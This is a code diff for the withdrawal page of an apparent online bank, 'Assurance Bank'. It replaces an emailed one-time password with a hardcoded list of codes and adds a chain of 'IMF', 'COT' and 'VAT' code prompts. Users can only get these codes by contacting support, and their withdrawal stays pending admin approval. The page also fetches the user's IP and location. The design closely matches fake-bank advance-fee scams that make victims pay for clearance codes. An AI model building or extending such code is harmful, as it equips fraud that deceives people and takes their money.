@@ -1,14 +1,265 @@
 ﻿import { supabase } from '../../utils/supabaseClient';
 import navbar from './components/Navbar';
 import { showToast } from '../../components/toast';
-import { sendEmail } from './functions/Emailing/sendEmail';
 import { reset } from '../../utils/reset';
+import NoBg from "/src/images/logo-nobg.png"
+
+const complexCodes = [
+    "E9876567", "G0876578", "8767898H", "K2387651", "456L7890", "1M234567", "987654N3", "O2345678", "98765P43", "Q1987654",
+    "R7654321", "567S1234", "T3456789", "876543U1", "V1234567", "345678W9", "X2345678", "9Y876543", "Z3456781", "234567A8",
+    "B3456781", "123456C7", "D2345678", "876E5432", "5678F123", "6789G123", "7890H234", "8901I345", "9012J456", "0123K567",
+    "K4561237", "L5672348", "M6783459", "N7894560", "O8905671", "P9016782", "Q0127893", "R1238904", "S2349015", "T3450126",
+    "U4561237", "V5672348", "W6783459", "X7894560", "Y8905671", "Z9016782", "A0127893", "B1238904", "C2349015", "D3450126",
+    "E4561237", "F5672348", "G6783459", "H7894560", "I8905671", "J9016782", "K0127893", "L1238904", "M2349015", "N3450126",
+    "O4561237", "P5672348", "Q6783459", "R7894560", "S8905671", "T9016782", "U0127893", "V1238904", "W2349015", "X3450126",
+    "Y4561237", "Z5672348", "A6783459", "B7894560", "C8905671", "D9016782", "E0127893", "F1238904", "G2349015", "H3450126",
+    "I4561237", "J5672348", "K6783459", "L7894560", "M8905671", "N9016782", "O0127893", "P1238904", "Q2349015", "R3450126",
+    "S4561237", "T5672348", "U6783459", "V7894560", "W8905671", "X9016782", "Y0127893", "Z1238904", "A2349015", "B3450126",
+    "C4561237", "D5672348", "E6783459", "F7894560", "G8905671", "H9016782", "I0127893", "J1238904", "K2349015", "L3450126",
+    "M4561237", "N5672348", "O6783459", "P7894560", "Q8905671", "R9016782", "S0127893", "T1238904", "U2349015", "V3450126",
+    "W4561237", "X5672348", "Y6783459", "Z7894560", "A8905671", "B9016782", "C0127893", "D1238904", "E2349015", "F3450126",
+    "G4561237", "H5672348", "I6783459", "J7894560", "K8905671", "L9016782", "M0127893", "N1238904", "O2349015", "P3450126"
+];
+
+// Helper: Get IP and Location
+async function getIpLocation() {
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        return await res.json();
+    } catch {
+        return {};
+    }
+}
+
+// Helper: Generate Receipt
+function generateReceipt(options = {}) {
+    const defaults = {
+        title: "Withdrawal Receipt",
+        receiptId: generateReceiptId(),
+        date: new Date().toLocaleDateString(),
+        time: new Date().toLocaleTimeString(),
+        amount: "0.00",
+        currency: "$",
+        description: "Withdrawal",
+        senderName: "",
+        recipientBank: "",
+        recipientAccount: "",
+        transactionType: "Withdrawal",
+        status: "Pending",
+        referenceNumber: "",
+        fees: "0.00",
+        totalAmount: "",
+        companyName: "Assurance Bank",
+        companyAddress: "123 Main St, City, Country",
+        companyPhone: "+1 (555) 123-4567",
+        companyEmail: "assurancebankcc@gmail.com",
+        additionalFields: {},
+        showFooter: true,
+        footerText: "Thank you for banking with us!",
+    };
+    const config = { ...defaults, ...options };
+    if (!config.totalAmount) {
+        const amount = parseFloat(config.amount) || 0;
+        const fees = parseFloat(config.fees) || 0;
+        config.totalAmount = (amount + fees).toFixed(2);
+    }
+    return `
+    <div class="receipt-container font-mono">
+      <div class="text-center mb-4">
+        <img src="${NoBg}" alt="Assurance Bank" class="h-10 mx-auto mb-2" />
+        <h2 class="font-bold text-2xl text-gray-900 dark:text-white mb-1">${config.title}</h2>
+        <div class="text-base text-gray-700 dark:text-gray-300">${config.companyName}</div>
+        <div class="text-xs text-gray-500 dark:text-gray-400">${config.companyAddress}</div>
+        <div class="text-xs text-gray-500 dark:text-gray-400">${config.companyPhone} | ${config.companyEmail}</div>
+      </div>
+      <div class="mb-4 border-b border-dashed border-gray-300 dark:border-gray-700 pb-3">
+        <div class="flex justify-between text-xs mb-1">
+          <span class="font-semibold">Receipt ID:</span><span>${config.receiptId}</span>
+        </div>
+        <div class="flex justify-between text-xs mb-1">
+          <span class="font-semibold">Date:</span><span>${config.date}</span>
+        </div>
+        <div class="flex justify-between text-xs mb-1">
+          <span class="font-semibold">Time:</span><span>${config.time}</span>
+        </div>
+        <div class="flex justify-between text-xs mb-1">
+          <span class="font-semibold">Type:</span><span>${config.transactionType}</span>
+        </div>
+        <div class="flex justify-between text-xs">
+          <span class="font-semibold">Status:</span>
+          <span class="font-bold" style="color:${config.status === "Completed" ? "#16a34a" : config.status === "Pending" ? "#f59e42" : "#dc2626"};">
+            ${config.status}
+          </span>
+        </div>
+      </div>
+      <div class="mb-4">
+        <h3 class="text-center text-base font-semibold text-gray-800 dark:text-gray-200 mb-2">Transaction Details</h3>
+        <div class="flex justify-between text-xs mb-1">
+          <span class="font-semibold">From:</span><span>${config.senderName}</span>
+        </div>
+        <div class="flex justify-between text-xs mb-1">
+          <span class="font-semibold">To Bank:</span><span>${config.recipientBank}</span>
+        </div>
+        <div class="flex justify-between text-xs mb-1">
+          <span class="font-semibold">To Account:</span><span>${config.recipientAccount}</span>
+        </div>
+        <div class="flex justify-between text-xs mb-1">
+          <span class="font-semibold">Description:</span><span>${config.description}</span>
+        </div>
+        <div class="flex justify-between text-xs">
+          <span class="font-semibold">Reference:</span><span>${config.referenceNumber}</span>
+        </div>
+      </div>
+      <div class="mb-4 border-t border-dashed border-gray-300 dark:border-gray-700 pt-3">
+        <div class="flex justify-between text-sm mb-1">
+          <span class="font-semibold">Amount:</span><span>${config.currency}${config.amount}</span>
+        </div>
+        ${parseFloat(config.fees) > 0
+            ? `<div class="flex justify-between text-sm mb-1">
+                  <span class="font-semibold">Fees:</span><span>${config.currency}${config.fees}</span>
+                </div>`
+            : ""
+        }
+        <div class="flex justify-between text-base font-bold border-t border-gray-300 dark:border-gray-700 pt-2">
+          <span>Total:</span><span>${config.currency}${config.totalAmount}</span>
+        </div>
+      </div>
+      ${Object.keys(config.additionalFields).length > 0
+            ? `<div class="mb-4 border-t border-dashed border-gray-300 dark:border-gray-700 pt-3">
+                ${Object.entries(config.additionalFields)
+                .map(([key, value]) => `
+                      <div class="flex justify-between text-xs mb-1">
+                        <span class="font-semibold">${key}:</span><span>${value}</span>
+                      </div>
+                    `).join("")}
+              </div>`
+            : ""
+        }
+      ${config.showFooter
+            ? `<div class="text-center mt-4 pt-3 border-t-2 border-dashed border-gray-300 dark:border-gray-700 text-xs text-gray-500 dark:text-gray-400">
+                <div>${config.footerText}</div>
+                <div class="mt-2 text-[11px] text-gray-400 dark:text-gray-500">
+                  This is an Assurance Bank-generated receipt
+                </div>
+              </div>`
+            : ""
+        }
+    </div>
+    `;
+}
+
+function generateReceiptId() {
+    const timestamp = Date.now().toString().slice(-6);
+    const random = Math.random().toString(36).substr(2, 4).toUpperCase();
+    return `RCP-${timestamp}-${random}`;
+}
+
+// Modal for IMF, COT, VAT codes
+function showCodeModal(type, onSuccess) {
+    let modal = document.getElementById("code-modal");
+    if (!modal) {
+        modal = document.createElement("div");
+        modal.id = "code-modal";
+        document.body.appendChild(modal);
+    }
+    modal.className = "";
+    modal.innerHTML = `
+    <div class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
+      <div class="bg-white dark:bg-gray-900 rounded-lg shadow-lg w-full max-w-sm p-6 relative">
+        <button id="close-code-modal" class="absolute top-2 right-3 text-gray-400 hover:text-gray-700 dark:hover:text-white text-lg">&times;</button>
+        <h4 class="text-base font-semibold mb-2 text-gray-900 dark:text-white">
+          <i class="fa fa-key mr-2"></i>Enter ${type} Code
+        </h4>
+        <div class="mb-2 text-xs text-gray-500 dark:text-gray-300">
+          Please enter your ${type} code to proceed.<br>
+          <span class="text-red-500">Contact <a href="/contact" target="_blank" class="underline">Support</a> to get your code or chat with admin live.</span>
+        </div>
+        <form id="code-form" class="space-y-3">
+          <input type="text" name="code" maxlength="12"
+            class="w-full px-3 py-2 border rounded focus:outline-none focus:ring"
+            placeholder="Enter ${type} Code" required />
+          <button type="submit"
+            class="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition">
+            <i class="fa fa-check"></i> Validate
+          </button>
+        </form>
+      </div>
+    </div>
+  `;
+    document.getElementById("close-code-modal").onclick = () => {
+        modal.innerHTML = "";
+        modal.className = "hidden";
+    };
+    document.getElementById("code-form").onsubmit = async function (e) {
+        e.preventDefault();
+        const code = this.code.value.trim();
+        if (complexCodes.includes(code)) {
+            modal.innerHTML = "";
+            modal.className = "hidden";
+            onSuccess();
+        } else {
+            showToast("Invalid code. Please contact support.", "error");
+        }
+    };
+}
+
+// Success Animation Modal
+function showSuccessModal() {
+    let modal = document.getElementById("success-modal");
+    if (!modal) {
+        modal = document.createElement("div");
+        modal.id = "success-modal";
+        document.body.appendChild(modal);
+    }
+    modal.className = "";
+    modal.innerHTML = `
+    <div class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60">
+      <div class="bg-white dark:bg-gray-900 rounded-lg shadow-2xl w-full max-w-xs p-8 flex flex-col items-center relative">
+        <canvas id="success-canvas" width="120" height="120" style="display:block;margin-bottom:16px;"></canvas>
+        <h3 class="text-lg font-bold text-green-700 dark:text-green-400 mb-2">Withdrawal Successful!</h3>
+        <p class="text-sm text-gray-700 dark:text-gray-300 mb-2 text-center">Your withdrawal was submitted and is <b>awaiting Admin approval</b>.</p>
+        <button id="close-success-modal" class="mt-4 px-5 py-2 rounded bg-blue-600 text-white hover:bg-blue-700 transition">Close</button>
+      </div>
+    </div>
+    <style>
+      #success-canvas { background: transparent; }
+    </style>
+  `;
+    const canvas = document.getElementById("success-canvas");
+    const ctx = canvas.getContext("2d");
+    let progress = 0;
+    function drawCheck() {
+        ctx.clearRect(0, 0, 120, 120);
+        ctx.lineWidth = 6;
+        ctx.strokeStyle = "#16a34a";
+        ctx.beginPath();
+        ctx.arc(60, 60, 48, Math.PI * 0.5, Math.PI * (2 * progress), false);
+        ctx.stroke();
+        if (progress < 1) {
+            progress += 0.03;
+            requestAnimationFrame(drawCheck);
+        } else {
+            ctx.beginPath();
+            ctx.moveTo(40, 65);
+            ctx.lineTo(55, 80);
+            ctx.lineTo(85, 45);
+            ctx.strokeStyle = "#16a34a";
+            ctx.lineWidth = 8;
+            ctx.stroke();
+        }
+    }
+    drawCheck();
+    document.getElementById("close-success-modal").onclick = () => {
+        modal.innerHTML = "";
+        modal.className = "hidden";
+        window.location.reload();
+    };
+}
 
 const withdrawal = async () => {
     const nav = navbar();
     reset("Assurance Bank | Withdrawal");
 
-    // Fetch session and user/account data
     const session = await supabase.auth.getSession();
     if (!session.data.session) {
         window.location.href = "/login";
@@ -16,21 +267,25 @@ const withdrawal = async () => {
     }
     const { user } = session.data.session;
 
-    // Fetch profile and account
-    const { data: profile } = await supabase.from('profiles').select('*').eq('id', user.id).single();
-    const { data: account } = await supabase.from('accounts').select('*').eq('user_id', user.id).single();
+    const { data: profile } = await supabase
+        .from('profiles')
+        .select('*')
+        .eq('id', user.id)
+        .single();
+    let { data: account } = await supabase
+        .from('accounts')
+        .select('*')
+        .eq('user_id', user.id)
+        .single();
 
-    const fmt = v => typeof v === 'number' ? v.toLocaleString('en-US', { style: 'currency', currency: 'USD', minimumFractionDigits: 2 }) : v || '$0.00';
-
-    async function sendNotification(title, message, type = "info") {
-        await supabase.from('notifications').insert([{
-            user_id: user.id,
-            title,
-            message,
-            type,
-            read: false
-        }]);
-    }
+    const fmt = (v) =>
+        typeof v === 'number'
+            ? v.toLocaleString('en-US', {
+                style: 'currency',
+                currency: 'USD',
+                minimumFractionDigits: 2,
+            })
+            : v || '$0.00';
 
     function pageEvents() {
         nav.pageEvents?.();
@@ -39,241 +294,344 @@ const withdrawal = async () => {
         if (withdrawalForm) {
             withdrawalForm.onsubmit = async function (e) {
                 e.preventDefault();
-                const amount = parseFloat(this.amount.value);
-                const desc = this.desc.value.trim();
-                const bank = this.bank.value.trim();
-                const accNum = this.account_number.value.trim();
-                const accName = this.account_name.value.trim();
-                const type = this.type.value;
 
-                if (amount < 200) return showToast("Minimum withdrawal is $200", "error");
-                if (!bank || !accNum || !accName) return showToast("All bank details required.", "error");
+                try {
+                    const amount = parseFloat(this.amount.value);
+                    const desc = this.desc.value.trim();
+                    const bank = this.bank.value.trim();
+                    const accNum = this.account_number.value.trim();
+                    const accName = this.account_name.value.trim();
+                    const accountType = this.type.value;
 
-                // Get balances for transaction record
-                const balance_before = account.balance || 0;
-                const balance_after = balance_before - amount;
+                    if (amount < 200) {
+                        showToast("Minimum withdrawal is $200", "error");
+                        return;
+                    }
+                    if (!bank || !accNum || !accName) {
+                        showToast("All bank details required.", "error");
+                        return;
+                    }
+                    if (amount > account.balance) {
+                        showToast("Insufficient balance.", "error");
+                        return;
+                    }
 
-                // Generate OTP and send email
-                const otp = Math.floor(100000 + Math.random() * 900000).toString();
-                window.__withdrawOtp = otp;
+                    const ipLoc = await getIpLocation();
+                    const balance_before = account.balance;
+                    const balance_after = balance_before - amount;
 
-                await sendEmail({
-                    to: profile.email,
-                    subject: "Withdrawal OTP Verification",
-                    html: `
-                        <div style="font-family:sans-serif;max-width:480px;margin:auto;background:#f9f9f9;padding:24px;border-radius:8px;">
-                            <h2 style="color:#2563eb;">Withdrawal OTP Verification</h2>
-                            <p>Hello <b>${profile.full_name}</b>,</p>
-                            <p>Your OTP for withdrawal of <b>${fmt(amount)}</b> is:</p>
-                            <div style="font-size:2rem;font-weight:bold;letter-spacing:4px;color:#16a34a;margin:16px 0;">${otp}</div>
-                            <p>For: <b>${desc}</b></p>
-                            <p>Account: <b>${account.account_number}</b></p>
-                            <p style="color:#888;font-size:12px;">If you did not initiate this, please contact support immediately.</p>
-                            <hr style="margin:16px 0;">
-                            <div style="font-size:11px;color:#aaa;">Assurance Bank</div>
-                        </div>
-                    `
+                    const { error: updateError } = await supabase
+                        .from('accounts')
+                        .update({ balance: balance_after })
+                        .eq('id', account.id);
+
+                    if (updateError) {
+                        showToast("Failed to process withdrawal.", "error");
+                        return;
+                    }
+
+                    account.balance = balance_after;
+
+                    showOTPModal({
+                        amount,
+                        desc,
+                        bank,
+                        accNum,
+                        accName,
+                        accountType,
+                        profile,
+                        account,
+                        balance_before,
+                        balance_after,
+                        ipLoc,
+                    });
+                } catch (error) {
+                    console.error(error);
+                    showToast("An error occurred. Please try again.", "error");
+                }
+            };
+        }
+
+        function showOTPModal(tx) {
+            let modal = document.getElementById('withdrawal-otp-modal');
+            if (!modal) {
+                modal = document.createElement('div');
+                modal.id = 'withdrawal-otp-modal';
+                document.body.appendChild(modal);
+            }
+            modal.className = '';
+            modal.innerHTML = `
+        <div class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-40">
+          <div class="bg-white dark:bg-gray-900 rounded-lg shadow-lg w-full max-w-sm p-6 relative">
+            <button id="close-otp-modal" class="absolute top-2 right-3 text-gray-400 hover:text-gray-700 dark:hover:text-white text-lg">&times;</button>
+            <h4 class="text-base font-semibold mb-2 text-gray-900 dark:text-white">
+              <i class="fa fa-lock mr-2"></i>Verify Withdrawal
+            </h4>
+            <div class="mb-2 text-xs text-gray-500 dark:text-gray-300">
+              Please enter your verification code to complete the withdrawal.
+            </div>
+            <form id="otp-form" class="space-y-3">
+              <input type="text" name="otp" maxlength="8" class="w-full px-3 py-2 border rounded focus:outline-none focus:ring" placeholder="Enter Verification Code" required />
+              <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition">
+                <i class="fa fa-check"></i> Verify
+              </button>
+            </form>
+          </div>
+        </div>
+      `;
+            document.getElementById('close-otp-modal').onclick = () => {
+                modal.innerHTML = '';
+                modal.className = 'hidden';
+            };
+            document.getElementById('otp-form').onsubmit = async function (e) {
+                e.preventDefault();
+                const code = this.otp.value.trim();
+
+                if (!complexCodes.includes(code)) {
+                    showToast("Invalid verification code.", "error");
+                    return;
+                }
+
+                showReceiptModal(tx);
+            };
+        }
+
+        function showReceiptModal(tx) {
+            let modal = document.getElementById('withdrawal-otp-modal');
+            modal.className = '';
+            modal.innerHTML = `
+        <div class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 transition-opacity duration-300">
+          <div class="receipt-modal-content bg-white dark:bg-gray-900 rounded-xl shadow-2xl w-full max-w-md mx-2 p-0 relative overflow-auto" style="max-height:90vh;">
+            <button id="close-receipt-modal" class="absolute top-3 right-4 text-gray-400 hover:text-red-500 dark:hover:text-white text-2xl font-bold z-10" aria-label="Close">&times;</button>
+            <div class="p-6">
+              ${generateReceipt({
+                id: generateReceiptId(),
+                date: new Date().toLocaleDateString(),
+                time: new Date().toLocaleTimeString(),
+                amount: tx.amount,
+                currency: "$",
+                description: tx.desc,
+                senderName: tx.profile.full_name,
+                recipientBank: tx.bank,
+                recipientAccount: tx.accNum,
+                transactionType: "Withdrawal",
+                status: "Pending",
+                referenceNumber: tx.accNum,
+                fees: "0.00",
+                totalAmount: tx.amount,
+                additionalFields: {
+                    "Account Name": tx.accName,
+                    "Account Type": tx.accountType,
+                    IP: tx.ipLoc.ip || "N/A",
+                    Location: `${tx.ipLoc.city || ""}, ${tx.ipLoc.region || ""}, ${tx.ipLoc.country_name || ""}`,
+                },
+            })}
+              <div class="mt-6 flex flex-col gap-2 justify-center">
+                <button id="complete-withdrawal-btn" class="bg-green-600 text-white px-6 py-2 rounded shadow hover:bg-green-700 transition font-semibold">
+                  Complete Transaction
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div id="code-modal" class="hidden"></div>
+        <style>
+          .receipt-modal-content::-webkit-scrollbar { width: 8px; background: transparent; }
+          .receipt-modal-content::-webkit-scrollbar-thumb { background: #e5e7eb; border-radius: 4px; }
+          .dark .receipt-modal-content::-webkit-scrollbar-thumb { background: #334155; }
+          .receipt-container {
+            background: repeating-linear-gradient(135deg, #f8fafc 0px, #e0e7ef 80%, #f8fafc 100%);
+            border-radius: 16px;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.10);
+            padding: 0;
+          }
+          .dark .receipt-container {
+            background: linear-gradient(135deg, #1e293b 0px, #334155 80%, #1e293b 100%);
+            box-shadow: 0 4px 24px rgba(0,0,0,0.40);
+          }
+        </style>
+      `;
+
+            document.getElementById('close-receipt-modal').onclick = () => {
+                modal.innerHTML = '';
+                modal.className = 'hidden';
+            };
+
+            document.getElementById('complete-withdrawal-btn').onclick = () => {
+                showCodeModal("IMF", () => {
+                    showCodeModal("COT", () => {
+                        showCodeModal("VAT", async () => {
+                            showSuccessModal();
+                            try {
+                                const { data: txn, error: insertError } = await supabase
+                                    .from('transactions')
+                                    .insert([
+                                        {
+                                            account_id: tx.account.id,
+                                            user_id: tx.profile.id,
+                                            type: "withdrawal",
+                                            description: tx.desc,
+                                            amount: tx.amount,
+                                            balance_before: tx.balance_before,
+                                            balance_after: tx.balance_after,
+                                            status: "pending",
+                                        },
+                                    ])
+                                    .select();
+
+                                if (insertError) {
+                                    console.error('Insert error:', insertError);
+                                    showToast("Failed to save transaction.", "error");
+                                    return;
+                                }
+
+                                await supabase.from('notifications').insert([
+                                    {
+                                        user_id: tx.profile.id,
+                                        title: "Withdrawal Initiated",
+                                        message: `Your withdrawal of ${fmt(tx.amount)} to ${tx.accName} is awaiting admin approval.`,
+                                        type: "info",
+                                        read: false,
+                                    },
+                                ]);
+                            } catch (err) {
+                                showToast(
+                                    "Failed to process transaction. Please try again.",
+                                    "error"
+                                );
+                            }
+                        });
+                    });
                 });
-
-                await sendNotification(
-                    "Withdrawal OTP Verification",
-                    `Your OTP for withdrawal of ${fmt(amount)} is: ${otp}`,
-                    "info"
-                );
-
-                showOtpModal({ amount, desc, bank, accNum, accName, type, otp, balance_before, balance_after });
             };
         }
     }
 
-    function showOtpModal({ amount, desc, bank, accNum, accName, type, otp, balance_before, balance_after }) {
-        let modal = document.getElementById('withdrawal-otp-modal');
-        if (!modal) {
-            modal = document.createElement('div');
-            modal.id = 'withdrawal-otp-modal';
-            document.body.appendChild(modal);
-        }
-        modal.innerHTML = `
-            <div class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-40">
-                <div class="bg-white dark:bg-gray-900 rounded-lg shadow-lg w-full max-w-md p-6 relative">
-                    <button id="close-otp-modal" class="absolute top-2 right-3 text-gray-400 hover:text-gray-700 dark:hover:text-white text-lg">&times;</button>
-                    <h4 class="text-base font-semibold mb-2 text-gray-900 dark:text-white">Withdrawal OTP Verification</h4>
-                    <div class="mb-2 text-xs text-gray-500 dark:text-gray-300">Enter the OTP sent to your email to confirm your withdrawal.</div>
-                    <form id="otp-form" class="space-y-3">
-                        <div>
-                            <label class="block text-xs text-gray-500 mb-1 font-semibold">OTP</label>
-                            <input type="text" name="otp" class="w-full border border-gray-300 rounded px-2 py-1 text-xs focus:border-blue-500" maxlength="6" required>
-                        </div>
-                        <div class="flex justify-end gap-2 pt-2">
-                            <button type="submit" class="px-4 py-1 rounded bg-blue-600 text-white hover:bg-blue-700 text-xs font-semibold"><i class="fa fa-check"></i> Confirm</button>
-                        </div>
-                    </form>
-                </div>
-            </div>
-        `;
-        modal.className = '';
-        document.getElementById('close-otp-modal').onclick = () => {
-            modal.innerHTML = '';
-            modal.className = 'hidden';
-        };
-        document.getElementById('otp-form').onsubmit = async function (e) {
-            e.preventDefault();
-            const enteredOtp = this.otp.value.trim();
-            if (enteredOtp !== window.__withdrawOtp) {
-                showToast("Invalid OTP!", "error");
-                return;
-            }
-            // Insert into transactions table
-            const { error: txError } = await supabase.from('transactions').insert([{
-                account_id: account.id,
-                user_id: user.id,
-                type: 'withdrawal',
-                amount: amount,
-                description: desc,
-                balance_before,
-                balance_after,
-                status: 'pending'
-            }]);
-            if (txError) {
-                showToast("Withdrawal failed: " + txError.message, "error");
-                return;
-            }
-
-            await sendEmail({
-                to: profile.email,
-                subject: "Withdrawal Request Initiated",
-                html: `
-                    <div style="font-family:sans-serif;max-width:480px;margin:auto;background:#f9f9f9;padding:24px;border-radius:8px;">
-                        <h2 style="color:#2563eb;">Withdrawal Request Initiated</h2>
-                        <p>Hello <b>${profile.full_name}</b>,</p>
-                        <p>Your withdrawal request has been received:</p>
-                        <ul style="margin:12px 0 16px 18px;padding:0;font-size:15px;">
-                            <li><b>Amount:</b> ${fmt(amount)}</li>
-                            <li><b>Description:</b> ${desc}</li>
-                            <li><b>Bank:</b> ${bank}</li>
-                            <li><b>Account Number:</b> ${accNum}</li>
-                            <li><b>Account Name:</b> ${accName}</li>
-                            <li><b>Type:</b> ${type}</li>
-                            <li><b>Date/Time:</b> ${new Date().toLocaleString()}</li>
-                        </ul>
-                        <p style="color:#888;font-size:12px;">We will notify you once your withdrawal is confirmed.</p>
-                        <hr style="margin:16px 0;">
-                        <div style="font-size:11px;color:#aaa;">Assurance Bank</div>
-                    </div>
-                `
-            });
-
-            await sendNotification(
-                "Withdrawal Request Initiated",
-                `Your withdrawal request of ${fmt(amount)} has been received and is pending approval, contact our customer support on the website to complete any pending transaction.`,
-                "info"
-            );
-
-            showToast("Withdrawal submitted, Contact Support to complete the transaction ", "warning");
-            modal.innerHTML = '';
-            modal.className = 'hidden';
-            setTimeout(() => window.location.href = "/account-summary", 2000);
-        };
-    }
-
     return {
-        html: /*html*/`
+        html: /*html*/ `
+      <div class="relative">
         ${nav.html}
         <div class="bg-gray-50 dark:bg-gray-900 font-sans min-h-screen pt-12">
-            <div id="main-content" class="ml-56 pt-14 transition-all duration-300 font-sans min-h-screen">
-                <div class="p-4 max-w-6xl mx-auto">
-                    <nav class="flex items-center space-x-2 text-xs mb-4">
-                        <i class="fa fa-home text-gray-500"></i>
-                        <span class="text-gray-500">/</span>
-                        <span class="text-gray-700 dark:text-gray-300">Withdrawal</span>
-                    </nav>
-                    <div class="flex flex-wrap gap-2 mb-6">
-                        <div class="bg-green-100 rounded px-4 py-2 flex items-center gap-2">
-                            <i class="fa fa-briefcase text-green-700"></i>
-                            <div>
-                                <div class="text-xs font-semibold text-green-800">${fmt(account?.balance)}</div>
-                                <div class="text-[10px] text-green-600">Account Balance</div>
-                            </div>
-                        </div>
-                        <div class="bg-blue-100 rounded px-4 py-2 flex items-center gap-2">
-                            <i class="fa fa-refresh text-blue-700"></i>
-                            <div>
-                                <div class="text-xs font-semibold text-blue-800">${account?.is_active ? 'Active' : 'Inactive'}</div>
-                                <div class="text-[10px] text-blue-600">Account Status</div>
-                            </div>
-                        </div>
-                        <div class="bg-orange-100 rounded px-4 py-2 flex items-center gap-2">
-                            <i class="fa fa-star text-orange-700"></i>
-                            <div>
-                                <div class="text-xs font-semibold text-orange-800">${account?.account_type || '-'}</div>
-                                <div class="text-[10px] text-orange-600">Account Type</div>
-                            </div>
-                        </div>
+          <div id="main-content" class="ml-14 md:ml-56 pt-14 transition-all duration-300 font-sans min-h-screen">
+            <div class="p-4">
+              <div class="mb-4">
+                <nav class="flex items-center space-x-2 text-xs">
+                  <i class="fa fa-home text-gray-500 text-xs"></i>
+                  <span class="text-gray-500">/</span>
+                  <span class="text-gray-700 dark:text-gray-300">Withdrawal</span>
+                </nav>
+              </div>
+              <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+                <div class="p-4 rounded bg-green-100 dark:bg-green-900 transition-all hover:shadow text-xs">
+                  <div class="flex items-center justify-between">
+                    <div>
+                      <h3 class="text-base font-semibold text-green-800 dark:text-green-300">${fmt(account?.balance)}</h3>
+                      <p class="text-xs text-green-600 dark:text-green-400 font-normal">Account Balance</p>
                     </div>
-                    <div class="bg-white dark:bg-gray-800 rounded shadow-sm p-4">
-                        <div class="flex items-center justify-between mb-2">
-                            <h3 class="text-base font-semibold text-gray-900 dark:text-white"><i class="fa fa-bank mr-2"></i> Withdrawal</h3>
-                        </div>
-                        <form id="withdrawal-form" class="space-y-4">
-                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                                <div>
-                                    <label class="block text-xs mb-1">Amount</label>
-                                    <div class="relative">
-                                        <input type="number" min="200" name="amount" class="w-full border border-gray-300 rounded px-2 py-1 text-xs focus:border-blue-500" placeholder="$500" required>
-                                        <span class="absolute right-2 top-2 text-gray-400"><i class="fa fa-money"></i></span>
-                                    </div>
-                                </div>
-                                <div>
-                                    <label class="block text-xs mb-1">Description</label>
-                                    <div class="relative">
-                                        <textarea name="desc" class="w-full border border-gray-300 rounded px-2 py-1 text-xs focus:border-blue-500" placeholder="Description" required></textarea>
-                                        <span class="absolute right-2 top-2 text-gray-400"><i class="fa fa-envelope"></i></span>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-                                <div>
-                                    <label class="block text-xs mb-1">Bank</label>
-                                    <input type="text" name="bank" class="w-full border border-gray-300 rounded px-2 py-1 text-xs focus:border-blue-500" required>
-                                </div>
-                                <div>
-                                    <label class="block text-xs mb-1">Account Number</label>
-                                    <input type="text" name="account_number" class="w-full border border-gray-300 rounded px-2 py-1 text-xs focus:border-blue-500" required>
-                                </div>
-                                <div>
-                                    <label class="block text-xs mb-1">Account Name</label>
-                                    <input type="text" name="account_name" class="w-full border border-gray-300 rounded px-2 py-1 text-xs focus:border-blue-500" required>
-                                </div>
-                            </div>
-                            <div>
-                                <label class="block text-xs mb-1">Account Type</label>
-                                <select name="type" class="w-full border border-gray-300 rounded px-2 py-1 text-xs focus:border-blue-500" required>
-                                    <option value="local">Local Account</option>
-                                    <option value="foreign">Foreign Account</option>
-                                </select>
-                            </div>
-                            <div class="flex gap-2">
-                                <button type="submit" class="btn bg-blue-600 text-white px-4 py-1 rounded text-xs"><i class="fa fa-donate"></i> Withdraw</button>
-                                <button type="reset" class="btn bg-gray-200 text-gray-700 px-4 py-1 rounded text-xs"><i class="fa fa-refresh"></i> Refresh</button>
-                            </div>
-                        </form>
+                    <div class="p-2 rounded-full bg-green-200 dark:bg-green-800">
+                      <i class="fa fa-briefcase text-green-700 dark:text-green-300 text-sm"></i>
                     </div>
+                  </div>
                 </div>
-                <footer class="p-4 text-center text-gray-600 dark:text-gray-400 text-xs">
-                    <p>
-                        <strong>Copyright © ${new Date().getFullYear()}</strong> All rights reserved | Assurance Bank.
-                    </p>
-                </footer>
+                <div class="p-4 rounded bg-blue-100 dark:bg-blue-900 transition-all hover:shadow text-xs">
+                  <div class="flex items-center justify-between">
+                    <div>
+                      <h3 class="text-base font-semibold text-blue-800 dark:text-blue-300">${account?.is_active ? "Active" : "Inactive"}</h3>
+                      <p class="text-xs text-blue-600 dark:text-blue-400 font-normal">Account Status</p>
+                    </div>
+                    <div class="p-2 rounded-full bg-blue-200 dark:bg-blue-800">
+                      <i class="fa fa-refresh text-blue-700 dark:text-blue-300 text-sm"></i>
+                    </div>
+                  </div>
+                </div>
+                <div class="p-4 rounded bg-orange-100 dark:bg-orange-900 transition-all hover:shadow text-xs">
+                  <div class="flex items-center justify-between">
+                    <div>
+                      <h3 class="text-base font-semibold text-orange-800 dark:text-orange-300">${account?.account_type || "USD SAVING"}</h3>
+                      <p class="text-xs text-orange-600 dark:text-orange-400 font-normal">Account Type</p>
+                    </div>
+                    <div class="p-2 rounded-full bg-orange-200 dark:bg-orange-800">
+                      <i class="fa fa-star text-orange-700 dark:text-orange-300 text-sm"></i>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div class="p-6 rounded bg-white dark:bg-gray-800 shadow-sm">
+                  <h3 class="text-lg font-semibold text-gray-900 dark:text-white mb-4"><i class="fa fa-arrow-down mr-2"></i> Withdrawal Request</h3>
+                  <form id="withdrawal-form" class="space-y-4">
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                      <div>
+                        <label class="block text-xs font-semibold mb-1">Amount (min: $200)</label>
+                        <div class="relative">
